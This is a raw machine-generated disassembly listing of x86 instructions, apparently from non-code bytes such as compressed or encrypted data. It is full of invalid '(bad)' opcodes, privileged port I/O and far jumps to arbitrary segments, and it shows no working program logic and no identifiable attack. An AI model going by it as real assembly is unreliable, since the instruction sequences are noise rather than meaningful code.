  6b6431:	adc    eax,0x6f54ce85
  6b6436:	loop   0x6b63e7
  6b6438:	lods   eax,DWORD PTR ds:[esi]
  6b6439:	aas    
  6b643a:	inc    edi
  6b643b:	loop   0x6b647f
  6b643d:	shl    DWORD PTR [edi-0x15e2a2c6],0x30
  6b6444:	mov    edx,0x680cbbf4
  6b6449:	lods   eax,DWORD PTR ds:[esi]
  6b644a:	or     al,0x34
  6b644c:	pop    esi
  6b644d:	inc    ebx
  6b644e:	repnz rcl BYTE PTR [eax+0x68],cl
  6b6452:	cmp    al,0x94
  6b6454:	push   edi
  6b6455:	sbb    al,0x98
  6b6457:	fwait
  6b6458:	or     DWORD PTR [eax],0xffffffdc
  6b645b:	xchg   ecx,eax
  6b645c:	shl    DWORD PTR [ecx+0x75ca6a25],cl
  6b6462:	or     eax,0x82c3e020
  6b6467:	(bad)  
  6b6468:	test   al,0x6c
  6b646a:	mov    ecx,0x250dda4d
  6b646f:	or     eax,0x9a361ada
  6b6474:	add    eax,0x30c731ec
  6b6479:	or     eax,DWORD PTR [ecx]
  6b647b:	push   esi
  6b647c:	jl     0x72f0bc73
  6b6482:	cmp    eax,0x4401a294
  6b6487:	lods   al,BYTE PTR ds:[esi]
  6b6488:	idiv   DWORD PTR [eax+0x64fa159a]
  6b648e:	inc    edi
  6b648f:	rcr    ecx,0xbe
  6b6492:	aas    
  6b6493:	mov    edx,0x694fb66a
  6b6498:	stos   DWORD PTR es:[edi],eax
  6b6499:	cmp    bh,al
  6b649b:	aas    
  6b649c:	push   ds
  6b649d:	inc    eax
  6b649e:	pop    ebp
  6b649f:	test   BYTE PTR [ebx+0x34],al
  6b64a2:	sub    DWORD PTR [ecx],esp
  6b64a4:	and    BYTE PTR [edi+0x69],0x97
  6b64a8:	mov    al,ds:0x1b009d19
  6b64ad:	cli    
  6b64ae:	out    0xbb,eax
  6b64b0:	mov    ebx,0x1d8c9cf6
  6b64b5:	imul   ecx,DWORD PTR [edi-0xe],0x9a30f3f2
  6b64bc:	xchg   DWORD PTR [ebp+0x22c817fd],ebp
  6b64c2:	adc    eax,0xd1b552bb
  6b64c7:	mov    dh,0x8d
  6b64c9:	outs   dx,DWORD PTR ds:[esi]
  6b64ca:	lds    edi,FWORD PTR [edx]
  6b64cc:	rol    DWORD PTR [edx],0x6e
  6b64cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b64d0:	mov    ch,ah
  6b64d2:	or     al,0xe4
  6b64d4:	xor    al,0x9c
  6b64d6:	in     al,0xcb
  6b64d8:	out    dx,al
  6b64d9:	and    cl,dh
  6b64db:	mov    BYTE PTR [ecx-0x3025765c],dh
  6b64e1:	pop    ebp
  6b64e2:	xchg   ebx,eax
  6b64e3:	scas   al,BYTE PTR es:[edi]
  6b64e4:	aaa    
  6b64e5:	jb     0x6b649b
  6b64e7:	mov    ah,0xa4
  6b64e9:	push   edx
  6b64ea:	dec    ebx
  6b64eb:	adc    ebx,DWORD PTR [eax]
  6b64ed:	xchg   bl,bh
  6b64ef:	std    
  6b64f0:	inc    esi
  6b64f1:	dec    esp
  6b64f2:	sbb    DWORD PTR [edx+0x12],ecx
  6b64f5:	(bad)  
  6b64f6:	jmp    DWORD PTR [eax]
  6b64f8:	rcl    BYTE PTR [edi],cl
  6b64fa:	xchg   ebx,eax
  6b64fb:	sbb    dl,al
  6b64fd:	inc    ebx
  6b64fe:	shl    DWORD PTR [edi+0x4dd885a5],cl
  6b6504:	rcl    BYTE PTR [ebp+0x3c],1
  6b6507:	mov    edx,0xbf147cdd
  6b650c:	sahf   
  6b650d:	mov    dh,ch
  6b650f:	mov    ecx,0x9bd0896
  6b6514:	cmp    al,dl
  6b6516:	ds aam 0xf9
  6b6519:	imul   ebx,DWORD PTR [eax+ebp*8-0x4c],0x1
  6b651e:	sbb    DWORD PTR [ebp-0x66],ebx
  6b6521:	mov    db2,ebx
  6b6524:	adc    BYTE PTR ds:0x977dbcc,dh
  6b652a:	jmp    0x6b6526
  6b652c:	(bad)  
  6b652d:	test   al,0xa3
  6b652f:	lds    ecx,FWORD PTR [esp+ebx*4]
  6b6532:	repz in eax,0x1a
  6b6535:	dec    ebx
  6b6536:	jae    0x6b65aa
  6b6538:	inc    edi
  6b6539:	loop   0x6b6535
  6b653b:	in     al,0xe6
  6b653d:	pop    esi
  6b653e:	jp     0x6b6515
  6b6540:	adc    al,ah
  6b6542:	adc    eax,0xb4660f66
  6b6547:	or     al,0x8a
  6b6549:	inc    edi
  6b654a:	fcmovnu st,st(0)
  6b654c:	loope  0x6b64d0
  6b654e:	jp     0x6b65a3
  6b6550:	or     eax,0x756b4dc3
  6b6555:	mov    ?,WORD PTR [ebx-0x7b]
  6b6558:	mov    bl,0xff
  6b655a:	push   esi
  6b655b:	ds pusha 
  6b655d:	mov    esi,0x8509bb61
  6b6562:	add    BYTE PTR [ebx],0xe1
  6b6565:	push   es
  6b6566:	dec    edx
  6b6567:	stc    
  6b6568:	addr16 push ds
  6b656a:	sub    DWORD PTR [esi-0x30],0x6f
  6b656e:	xchg   ebp,eax
  6b656f:	fadd   st,st(6)
  6b6571:	(bad)  
  6b6572:	push   0xf497f6da
  6b6577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b6578:	lock lea ebx,ds:0xedce46e9
  6b657f:	(bad)  
  6b6581:	aad    0x8
  6b6583:	sbb    eax,0x1f50b69
  6b6588:	push   esp
  6b6589:	cli    
  6b658a:	mov    ecx,0xa5dea320
  6b658f:	mov    ds:0x4c8d558e,eax
  6b6594:	sub    ah,BYTE PTR [esi-0x1c23335d]
  6b659a:	sbb    dh,BYTE PTR [edi-0x2b302c07]
  6b65a0:	jno    0x6b658d
  6b65a2:	bnd call 0xab1fb46e
  6b65a8:	mov    esp,0xfce13bb2
  6b65ad:	push   ds
  6b65ae:	dec    edx
  6b65af:	pusha  
  6b65b0:	mov    cl,0xda
  6b65b2:	mov    ?,WORD PTR [ecx-0x9c557c]
  6b65b8:	xchg   esp,eax
  6b65b9:	sti    
  6b65ba:	xchg   ebx,edi
  6b65bc:	add    BYTE PTR [ebx-0x5931a932],bh
  6b65c2:	fistp  QWORD PTR [ebp-0x3]
  6b65c5:	lea    eax,[edi-0x6f]
  6b65c8:	pushf  
  6b65c9:	std    
  6b65ca:	or     edx,edx
  6b65cc:	push   esp
  6b65cd:	je     0x6b6591
  6b65cf:	inc    edi
  6b65d0:	sbb    BYTE PTR [ebx-0x6be0eba0],ah
  6b65d6:	out    dx,eax
  6b65d7:	push   edx
  6b65d8:	ss ins DWORD PTR es:[edi],dx
  6b65da:	pop    ss
  6b65db:	test   BYTE PTR [edi],ch
  6b65dd:	stc    
  6b65de:	rcr    DWORD PTR [edi+0x49b2438d],1
  6b65e4:	inc    edi
  6b65e5:	jmp    0x7596:0x9690cb5d
  6b65ec:	test   DWORD PTR [edx-0x2d],0xed021f7d
  6b65f3:	ret    0xaee2
  6b65f6:	pop    esi
  6b65f7:	pop    esi
  6b65f8:	push   esp
  6b65f9:	ds in  eax,dx
  6b65fb:	int    0xeb
  6b65fd:	mov    dh,0xad
  6b65ff:	ds dec edx
  6b6601:	stc    
  6b6602:	fst    st(7)
  6b6604:	mov    ch,0x6f
  6b6606:	cmp    BYTE PTR [edi],ch
  6b6608:	(bad)  
  6b6609:	jl     0x6b6681
  6b660b:	into   
  6b660c:	mov    edi,0x208a0366
  6b6611:	out    0x4e,eax
  6b6613:	leave  
  6b6614:	inc    ebx
  6b6615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6616:	mov    edi,0xccd43ff4
  6b661b:	ret    0x3743
  6b661e:	int3   
  6b661f:	mov    cl,0x50
  6b6621:	(bad)  
  6b6622:	ror    BYTE PTR [edi-0x19],cl
  6b6625:	cmp    BYTE PTR [ecx+esi*4-0x81d59ca],cl
  6b662c:	cmp    esp,ecx
  6b662e:	sub    al,ah
  6b6630:	jmp    0x18f:0x5dba628f
  6b6637:	or     cl,BYTE PTR [ebp+eax*1-0x226d290a]
  6b663e:	cmp    eax,ebp
  6b6640:	push   es
  6b6641:	sbb    eax,0x7f47524e
  6b6646:	not    BYTE PTR [ebp+0x74]
  6b6649:	ret    
  6b664a:	mov    bl,ah
  6b664c:	jmp    0x766ad849
  6b6651:	sbb    bh,al
  6b6653:	addr16 (bad) 
  6b6656:	cmp    ch,al
  6b6658:	mov    eax,ds:0xb8655042
  6b665d:	mov    ch,0xe1
  6b665f:	push   ss
  6b6660:	in     eax,dx
  6b6661:	mov    ?,WORD PTR [edx-0x3378335b]
  6b6667:	push   ebx
  6b6668:	ins    BYTE PTR es:[edi],dx
  6b6669:	stos   BYTE PTR es:[edi],al
  6b666a:	test   eax,0x470f795f
  6b666f:	mov    ds:0x29b07d74,eax
  6b6674:	jmp    DWORD PTR [ecx+0xc]
  6b6677:	sbb    eax,0xa07aa50
  6b667c:	pop    ebp
  6b667d:	int3   
  6b667e:	inc    edi
  6b667f:	loope  0x6b66bc
  6b6681:	or     esp,esi
  6b6683:	fadd   QWORD PTR [eax+0x64]
  6b6686:	mov    esi,0x818492cd
  6b668b:	cwde   
  6b668c:	adc    ebp,esp
  6b668e:	xchg   ebp,eax
  6b668f:	xchg   edx,eax
  6b6690:	aaa    
  6b6691:	push   0xffffffe0
  6b6693:	js     0x6b6642
  6b6695:	ins    DWORD PTR es:[edi],dx
  6b6696:	sbb    esi,DWORD PTR [edi-0x39845f64]
  6b669c:	sub    BYTE PTR [edi-0x57],bh
  6b669f:	and    edi,esi
  6b66a1:	mov    eax,ds:0x376a588d
  6b66a6:	inc    eax
  6b66a7:	(bad)  
  6b66a8:	ficomp DWORD PTR [ecx+0x5db94c67]
  6b66ae:	aaa    
  6b66af:	lds    ebp,FWORD PTR [ebx-0x3b9b457d]
  6b66b5:	adc    BYTE PTR [ebp-0x3],cl
  6b66b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b66b9:	sub    al,0x76
  6b66bb:	jge    0x6b6646
  6b66bd:	arpl   WORD PTR [ecx],si
  6b66bf:	call   0xc2b013a1
  6b66c4:	sub    DWORD PTR [ebp-0xf],edi
  6b66c7:	xor    DWORD PTR [edi-0x3ecb9193],edi
  6b66cd:	xchg   BYTE PTR ds:0x86e97b46,dh
  6b66d3:	pop    ds
  6b66d4:	mov    eax,ds:0x4d3d1eb9
  6b66d9:	retf   
  6b66da:	fst    DWORD PTR ds:0x741a8fe
  6b66e0:	nop
  6b66e1:	pop    esp
  6b66e2:	and    DWORD PTR [ebp+0x649680a8],ecx
  6b66e8:	into   
  6b66e9:	or     esi,DWORD PTR [esi+0x6d48b614]
  6b66ef:	adc    DWORD PTR [eax-0x34],esi
  6b66f2:	mov    WORD PTR [ebp+0x20],cs
  6b66f5:	and    DWORD PTR [edx+0x34],ecx
  6b66f8:	arpl   WORD PTR [ebp+0x4a],dx
  6b66fb:	xor    cl,BYTE PTR [esi-0x71e68ce6]
  6b6701:	aas    
  6b6702:	cmp    al,0x69
  6b6704:	mov    ecx,0xf4500360
  6b6709:	jne    0x6b670a
  6b670b:	sbb    edx,DWORD PTR [esi]
  6b670d:	jo     0x6b669c
  6b670f:	adc    eax,0xf4d0b2e1
  6b6714:	push   eax
  6b6715:	inc    eax
  6b6716:	sti    
  6b6717:	push   ebp
  6b6718:	sbb    ecx,DWORD PTR [ebx-0x5]
  6b671b:	clc    
  6b671c:	ins    BYTE PTR es:[edi],dx
  6b671d:	push   edx
  6b671e:	xchg   eax,ebx
  6b6720:	dec    ecx
  6b6721:	fstp   DWORD PTR ds:0xda20116a
  6b6727:	sub    al,0xbd
  6b6729:	xor    DWORD PTR [esi+0x1ab8bddc],ebx
  6b672f:	in     al,0x7e
  6b6731:	mov    al,0x7b
  6b6733:	call   0xde3d:0x9454f3f8
  6b673a:	fisubr DWORD PTR [eax+0x4f]
  6b673d:	jno    0x6b66bf
  6b673f:	scas   al,BYTE PTR es:[edi]
  6b6740:	jne    0x6b673c
  6b6742:	inc    edi
  6b6743:	adc    ebp,DWORD PTR [edi-0x2627a0ea]
  6b6749:	mov    dh,0x2e
  6b674b:	or     eax,0xf6ab0bb1
  6b6750:	sti    
  6b6751:	ins    BYTE PTR es:[edi],dx
  6b6752:	ja     0x6b675e
  6b6754:	js     0x6b671e
  6b6756:	mov    bh,0xbf
  6b6758:	pop    eax
  6b6759:	into   
  6b675a:	retf   0xaa4
  6b675d:	fbld   TBYTE PTR [ecx+0x4bd6856c]
  6b6763:	mov    eax,ds:0x742158e3
  6b6768:	int3   
  6b6769:	or     edx,edi
  6b676b:	(bad)  
  6b676c:	jns    0x6b6743
  6b676e:	hlt    
  6b676f:	nop
  6b6770:	mov    eax,0x2d711e7c
  6b6775:	retf   0x98dd
  6b6778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b6779:	fisttp DWORD PTR [esi+0x7c]
  6b677c:	sub    edx,DWORD PTR [edx+0x7341faa7]
  6b6782:	mov    edx,0xe335f56e
  6b6787:	inc    eax
  6b6788:	es push cs
  6b678a:	xor    al,BYTE PTR [ecx+0x45d91e04]
  6b6790:	div    BYTE PTR [eax]
  6b6792:	pop    DWORD PTR [edi+0x39]
  6b6795:	pop    ecx
  6b6796:	adc    edx,DWORD PTR [edx+0x65]
  6b6799:	and    ch,BYTE PTR [ebp-0x684c6bbb]
  6b679f:	push   cs
  6b67a0:	or     eax,ebx
  6b67a2:	in     al,dx
  6b67a3:	push   eax
  6b67a4:	inc    edi
  6b67a5:	aam    0x27
  6b67a7:	fisub  WORD PTR [ecx]
  6b67a9:	dec    ebp
  6b67aa:	scas   al,BYTE PTR es:[edi]
  6b67ab:	ret    0x92fe
  6b67ae:	sub    DWORD PTR [edi],esp
  6b67b0:	jns    0x6b67dd
  6b67b2:	mov    cl,cl
  6b67b4:	out    0xea,eax
  6b67b6:	jmp    0xdd23aa72
  6b67bb:	xor    al,0xc1
  6b67bd:	call   0xa4ea:0x67b226bc
  6b67c4:	ret    0xe6d3
  6b67c7:	cs adc eax,0x211dd6eb
  6b67cd:	bound  ebx,QWORD PTR [esp+eax*4]
  6b67d0:	jnp    0x6b675f
  6b67d2:	cli    
  6b67d3:	and    bh,ah
  6b67d5:	dec    edi
  6b67d6:	or     BYTE PTR [edi+0x474d1e1a],dh
  6b67dc:	mov    eax,ds:0x422cf438
  6b67e1:	jmp    0x6b6768
  6b67e3:	pop    ss
  6b67e4:	retf   0x3741
  6b67e7:	mov    edx,0x985816ac
  6b67ec:	and    al,0x25
  6b67ee:	dec    edi
  6b67ef:	mov    edx,0x935314f6
  6b67f4:	sbb    edx,DWORD PTR [ecx]
  6b67f6:	sub    esi,DWORD PTR [edx]
  6b67f8:	fdiv   st(1),st
  6b67fa:	fs add al,0x54
  6b67fd:	push   cs
  6b67fe:	sar    bl,1
  6b6800:	adc    BYTE PTR [edi-0x67],0x9a
  6b6804:	fldenv [esi]
  6b6806:	sub    esp,esp
  6b6808:	add    BYTE PTR [ebx+0x24],dh
  6b680b:	test   eax,ecx
  6b680d:	mov    ch,0xf0
  6b680f:	mov    bl,0x37
  6b6811:	mov    bh,0x67
  6b6813:	test   al,0x28
  6b6815:	inc    edx
  6b6816:	nop
  6b6817:	bound  ecx,QWORD PTR ds:0x707ef761
  6b681d:	xchg   ecx,eax
  6b681e:	jl     0x6b6858
  6b6820:	dec    ebp
  6b6821:	arpl   cx,bp
  6b6823:	(bad)  
  6b6824:	jge    0x6b6817
  6b6826:	dec    edx
  6b6827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6828:	sahf   
  6b6829:	loop   0x6b6815
  6b682b:	fadd   st,st(3)
  6b682d:	int3   
  6b682e:	in     al,0xf5
  6b6830:	pop    es
  6b6831:	inc    ecx
  6b6832:	imul   esp,DWORD PTR [edi],0xc9de57dd
  6b6838:	and    al,0x1d
  6b683a:	dec    ecx
  6b683b:	mov    dl,BYTE PTR [esi+0x41]
  6b683e:	or     al,0xc3
  6b6840:	sar    esi,0x3b
  6b6843:	call   0x8a1b:0xa740b43e
  6b684a:	mov    esp,0xbad1fd54
  6b684f:	sub    esi,DWORD PTR [ecx+0x7b]
  6b6852:	(bad)  [edi-0x53192041]
  6b6858:	bound  eax,QWORD PTR [edx-0x48]
  6b685b:	dec    esi
  6b685c:	push   ebp
  6b685d:	arpl   WORD PTR [ebp+0x2],cx
  6b6860:	rep stos BYTE PTR es:[edi],al
  6b6862:	dec    edi
  6b6863:	add    BYTE PTR [ebp+edi*2+0x2053f37e],ch
  6b686a:	cmp    BYTE PTR [ebp-0x69],ah
  6b686d:	in     eax,dx
  6b686e:	sbb    edi,DWORD PTR [ecx+ecx*1]
  6b6871:	aas    
  6b6872:	jno    0x6b68b7
  6b6874:	sbb    al,0x7e
  6b6876:	sbb    al,dl
  6b6878:	mov    WORD PTR [esp+eax*1],es
  6b687b:	in     eax,dx
  6b687c:	sub    DWORD PTR [eax+0x26],ebp
  6b687f:	fdivr  QWORD PTR [ecx]
  6b6881:	add    DWORD PTR [ebx],ebx
  6b6883:	hlt    
  6b6884:	mov    ds:0x70c6ed54,eax
  6b6889:	xchg   edi,eax
  6b688a:	mov    edi,0xa2be4c07
  6b688f:	cmp    al,0x52
  6b6891:	xchg   DWORD PTR fs:[ecx],ebx
  6b6894:	jl     0x6b683b
  6b6896:	jl     0x6b68ac
  6b6898:	shl    ah,cl
  6b689a:	push   ss
  6b689b:	mov    ebx,0x890f6eec
  6b68a0:	mov    es,WORD PTR [esi]
  6b68a2:	popf   
  6b68a3:	retf   0xe212
  6b68a6:	in     eax,0x33
  6b68a8:	dec    esp
  6b68a9:	mov    BYTE PTR [esp+ebx*4],bl
  6b68ac:	cmp    ebp,DWORD PTR [ecx]
  6b68ae:	push   ss
  6b68af:	enter  0x84,0x5
  6b68b3:	fist   WORD PTR [edi+0x42]
  6b68b6:	rol    DWORD PTR [ecx-0x5e],cl
  6b68b9:	add    al,0x6d
  6b68bb:	adc    ax,sp
  6b68be:	xlat   BYTE PTR ds:[ebx]
  6b68bf:	and    DWORD PTR [ebx+0x6b67f853],eax
  6b68c5:	pushf  
  6b68c6:	inc    ebx
  6b68c7:	je     0x6b6899
  6b68c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b68ca:	je     0x6b6919
  6b68cc:	(bad)  
  6b68cd:	call   0xb8be01ca
  6b68d2:	ins    DWORD PTR es:[edi],dx
  6b68d3:	pop    ecx
  6b68d4:	push   ebp
  6b68d5:	jne    0x6b68c2
  6b68d7:	sbb    al,0x4b
  6b68d9:	stos   DWORD PTR es:[edi],eax
  6b68da:	das    
  6b68db:	push   ss
  6b68dc:	pop    ebp
  6b68dd:	addr16 jo 0x6b6922
  6b68e0:	lds    esp,FWORD PTR [ebx]
  6b68e2:	retf   0xd681
  6b68e5:	jbe    0x6b68c5
  6b68e7:	outs   dx,BYTE PTR ds:[esi]
  6b68e8:	(bad)  
  6b68ea:	into   
  6b68eb:	pop    es
  6b68ec:	inc    ecx
  6b68ed:	retf   
  6b68ee:	je     0x6b6941
  6b68f0:	cmp    esi,0x87c374ef
  6b68f6:	sbb    al,bh
  6b68f8:	shl    DWORD PTR [ecx-0x13],cl
  6b68fb:	jle    0x6b6945
  6b68fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b68fe:	iret   
  6b68ff:	jp     0x6b6960
  6b6901:	mov    al,0x89
  6b6903:	loope  0x6b6971
  6b6905:	cmp    DWORD PTR [eax+0x4],0x50b3d741
  6b690c:	retf   
  6b690d:	sub    ch,bl
  6b690f:	in     eax,dx
  6b6910:	shl    DWORD PTR [edi],cl
  6b6912:	in     eax,dx
  6b6913:	mov    al,0x13
  6b6915:	push   edx
  6b6916:	add    DWORD PTR [ecx],esi
  6b6918:	stos   DWORD PTR es:[edi],eax
  6b6919:	popa   
  6b691a:	iret   
  6b691b:	addr16 je 0x6b6936
  6b691e:	int    0xe4
  6b6920:	lds    eax,FWORD PTR [ecx-0x11]
  6b6923:	addr16 jne 0x6b68e0
  6b6926:	cmc    
  6b6927:	retf   
  6b6928:	rol    dl,0xa7
  6b692b:	lds    esi,FWORD PTR [ebx+0x65]
  6b692e:	jb     0x6b6996
  6b6930:	iret   
  6b6931:	ins    BYTE PTR es:[edi],dx
  6b6932:	adc    ebp,esi
  6b6934:	loopne 0x6b68d5
  6b6936:	or     edx,edi
  6b6938:	or     al,0x91
  6b693a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b693b:	pop    eax
  6b693c:	aaa    
  6b693d:	add    BYTE PTR [ebx-0x4bc58191],cl
  6b6943:	or     edx,DWORD PTR [ecx+0x7658f46f]
  6b6949:	jbe    0x6b69b0
  6b694b:	imul   ebx,DWORD PTR [ebp+0x527b60ba],0x9fc543db
  6b6955:	out    dx,eax
  6b6956:	lahf   
  6b6957:	rol    cl,0xdc
  6b695a:	push   cs
  6b695b:	out    dx,eax
  6b695c:	les    ebp,FWORD PTR [edi-0x744b20e0]
  6b6962:	leave  
  6b6963:	pop    esi
  6b6964:	sar    BYTE PTR [ecx],cl
  6b6966:	test   BYTE PTR [eax],0xa
  6b6969:	pushf  
  6b696a:	sar    DWORD PTR [ecx],1
  6b696c:	(bad)  
  6b696e:	inc    esp
  6b696f:	pop    esi
  6b6970:	jg     0x6b69af
  6b6972:	add    ecx,ecx
  6b6974:	test   eax,0xcae5f896
  6b6979:	adc    al,0xf3
  6b697b:	mov    ch,0xc3
  6b697d:	or     eax,0x46e8bca
  6b6982:	bound  edx,QWORD PTR [ebp+0xe16c7d1]
  6b6988:	dec    edx
  6b6989:	icebp  
  6b698a:	inc    ebp
  6b698b:	jae    0x6b694a
  6b698d:	ins    DWORD PTR es:[edi],dx
  6b698e:	clc    
  6b698f:	das    
  6b6990:	mov    edx,0x22e29fe8
  6b6995:	cmp    al,0x1
  6b6997:	sbb    edx,DWORD PTR [ebp-0x6f1e19ba]
  6b699d:	mov    edx,0x1592eb44
  6b69a2:	(bad)  [edi+0x65d5f76d]
  6b69a8:	inc    ecx
  6b69a9:	ret    
  6b69aa:	xor    DWORD PTR [edx],eax
  6b69ac:	inc    edx
  6b69ad:	mov    al,ds:0x208a1a55
  6b69b2:	add    edi,DWORD PTR [edx-0x26384409]
  6b69b8:	jle    0x6b6976
  6b69ba:	repz cmp ebp,esi
  6b69bd:	pop    esi
  6b69be:	cs jg  0x6b6a1b
  6b69c1:	adc    BYTE PTR [eax+0x6cf0aab7],dl
  6b69c7:	es ret 0x1281
  6b69cb:	adc    al,0x82
  6b69cd:	xadd   BYTE PTR [edx-0x3b74d395],cl
  6b69d4:	mov    esp,0xd6e4a56e
  6b69d9:	imul   esp,DWORD PTR gs:[esi+0x45],0xffffffb6
  6b69de:	pop    esp
  6b69df:	mov    dh,0x3a
  6b69e1:	push   ss
  6b69e2:	fmul   DWORD PTR [edi]
  6b69e4:	dec    eax
  6b69e5:	inc    esp
  6b69e6:	fisttp DWORD PTR [eax]
  6b69e8:	jp     0x6b6a69
  6b69ea:	add    dl,BYTE PTR [eax+0x284dc45]
  6b69f0:	rcl    BYTE PTR [edx],cl
  6b69f2:	jbe    0x6b6975
  6b69f4:	out    dx,eax
  6b69f5:	sub    BYTE PTR [edi-0x71d1fa47],al
  6b69fb:	pop    esp
  6b69fc:	ret    
  6b69fd:	popf   
  6b69fe:	inc    eax
  6b69ff:	das    
  6b6a00:	pushf  
  6b6a01:	push   ds
  6b6a02:	mov    eax,0xe9f16aa1
  6b6a07:	rcl    BYTE PTR [esi+0x6a],cl
  6b6a0a:	inc    ebp
  6b6a0b:	xchg   edx,eax
  6b6a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b6a0d:	xchg   edx,eax
  6b6a0e:	xchg   ebx,eax
  6b6a0f:	es dec eax
  6b6a11:	dec    esi
  6b6a12:	test   BYTE PTR [ebx],bh
  6b6a14:	(bad)  
  6b6a15:	(bad)  
  6b6a17:	(bad)
  6b6a1b:	dec    eax
  6b6a1c:	retf   0xc1fe
  6b6a1f:	add    dl,BYTE PTR [ebp+0x7c4d78a3]
  6b6a25:	test   DWORD PTR [edx+ebx*4-0x2c],ebx
  6b6a29:	es jae 0x6b69fd
  6b6a2c:	jecxz  0x6b6a24
  6b6a2e:	repz sbb al,0x45
  6b6a31:	adc    al,0xbe
  6b6a33:	adc    esp,DWORD PTR [ebx+eax*4+0x4cf269c5]
  6b6a3a:	pop    edi
  6b6a3b:	shl    dh,1
  6b6a3d:	inc    esi
  6b6a3e:	cmp    bl,BYTE PTR [ebx+0x68]
  6b6a41:	add    ah,BYTE PTR [edi-0x26]
  6b6a44:	fwait
  6b6a45:	xor    al,BYTE PTR [ebp+0x36]
  6b6a48:	add    ebx,ebx
  6b6a4a:	cld    
  6b6a4b:	fiadd  DWORD PTR [edx+0x6c2da9bf]
  6b6a51:	xchg   ecx,eax
  6b6a52:	mov    esp,0x205d2261
  6b6a57:	sub    esi,DWORD PTR [ebx-0x57]
  6b6a5a:	cmp    al,0x22
  6b6a5c:	hlt    
  6b6a5d:	push   0x5
  6b6a5f:	or     eax,0x66ba3e29
  6b6a64:	pop    es
  6b6a65:	or     dh,BYTE PTR [ebp-0x27]
  6b6a68:	and    eax,0x3116ba5c
  6b6a6d:	push   ebp
  6b6a6e:	test   al,bh
  6b6a70:	hlt    
  6b6a71:	and    ch,BYTE PTR [esi]
  6b6a73:	(bad)
  6b6a77:	aas    
  6b6a78:	or     bl,BYTE PTR [edx+0x1eac8e97]
  6b6a7e:	push   es
  6b6a7f:	mov    DWORD PTR [ecx],esp
  6b6a81:	aam    0xfe
  6b6a83:	fisub  WORD PTR [esi]
  6b6a85:	jae    0x6b6ad9
  6b6a87:	arpl   WORD PTR [ecx-0x3c],ax
  6b6a8a:	push   ebp
  6b6a8b:	jecxz  0x6b6a72
  6b6a8d:	sub    BYTE PTR [esp+eax*4+0x2892c7c2],bh
  6b6a94:	loop   0x6b6a44
  6b6a96:	push   ecx
  6b6a97:	and    DWORD PTR [ebx],0xfffffffb
  6b6a9a:	mov    eax,ds:0x877dca64
  6b6a9f:	loope  0x6b6ab3
  6b6aa1:	loope  0x6b6ade
  6b6aa3:	test   DWORD PTR [edi-0x77669c10],edx
  6b6aa9:	sbb    al,BYTE PTR [edx+0x17]
  6b6aac:	mov    ebx,0x3746060f
  6b6ab1:	aaa    
  6b6ab2:	pop    ds
  6b6ab3:	aam    0x8a
  6b6ab5:	or     al,0x66
  6b6ab7:	push   ss
  6b6ab8:	adc    ah,BYTE PTR [ebx+0x16]
  6b6abb:	rcr    esi,0x49
  6b6abe:	inc    edx
  6b6abf:	mov    esp,0xf6377dbf
  6b6ac4:	sub    al,0xa4
  6b6ac6:	lea    eax,[esp+ebp*1+0x1c]
  6b6aca:	sbb    cl,cl
  6b6acc:	mov    esp,DWORD PTR [edx+edi*2-0x3]
  6b6ad0:	jecxz  0x6b6b46
  6b6ad2:	test   ch,dh
  6b6ad4:	xor    DWORD PTR [ecx],eax
  6b6ad6:	addr16 addr16 mov esp,0xd6f6fece
  6b6add:	sub    cl,BYTE PTR [ebx+edx*1-0x6f]
  6b6ae1:	shr    eax,1
  6b6ae3:	push   ebx
  6b6ae4:	test   DWORD PTR [edx-0x1b],ecx
  6b6ae7:	popf   
  6b6ae8:	dec    esp
  6b6ae9:	mov    edi,0xd3dcadd1
  6b6aee:	test   BYTE PTR [ecx+0x42],bl
  6b6af1:	push   ebp
  6b6af2:	ror    DWORD PTR [eax-0xb34db85],cl
  6b6af8:	(bad)  
  6b6af9:	dec    edx
  6b6afa:	push   cs
  6b6afb:	popa   
  6b6afc:	cmp    BYTE PTR [ecx-0x413f095f],dh
  6b6b02:	ja     0x6b6acb
  6b6b04:	pop    esp
  6b6b05:	or     al,dl
  6b6b07:	loope  0x6b6a98
  6b6b09:	pop    ebx
  6b6b0a:	mov    dl,0xe8
  6b6b0c:	shl    esi,cl
  6b6b0e:	test   DWORD PTR [esi-0x6eb97fec],0x237abbed
  6b6b18:	jno    0x6b6b1a
  6b6b1a:	(bad)  
  6b6b1c:	jge    0x6b6b29
  6b6b1e:	retf   0xa641
  6b6b21:	dec    esp
  6b6b22:	cmp    al,BYTE PTR [esi]
  6b6b24:	inc    ecx
  6b6b25:	dec    edi
  6b6b26:	mov    al,0x2d
  6b6b28:	and    edx,DWORD PTR [esi+0x5d41732c]
  6b6b2e:	in     eax,dx
  6b6b2f:	mov    WORD PTR [eax+0x2b],cs
  6b6b32:	mov    ebp,0x3673b53e
  6b6b37:	xor    eax,0x3849ed33
  6b6b3c:	inc    ebx
  6b6b3d:	out    0xd2,eax
  6b6b3f:	mov    bl,0xf
  6b6b41:	mov    ds:0x556d17f7,al
  6b6b46:	sbb    BYTE PTR [ebp+0x2a7a9594],al
  6b6b4c:	xchg   esp,eax
  6b6b4d:	ret    0xbf30
  6b6b50:	or     ch,ah
  6b6b52:	(bad)  
  6b6b53:	adc    BYTE PTR [esi],bh
  6b6b55:	pop    edx
  6b6b56:	mov    esi,DWORD PTR [esi-0x1f]
  6b6b59:	sahf   
  6b6b5a:	(bad)  
  6b6b5b:	je     0x6b6ae5
  6b6b5d:	mov    al,0x61
  6b6b5f:	(bad)  
  6b6b60:	sbb    eax,0x33f5682c
  6b6b65:	add    ah,BYTE PTR [ebx-0x50649d9c]
  6b6b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b6b6c:	sahf   
  6b6b6d:	dec    ebp
  6b6b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b6b6f:	xbegin 0xf2581845
  6b6b75:	dec    ebp
  6b6b76:	push   cs
  6b6b77:	mov    edx,DWORD PTR [edx]
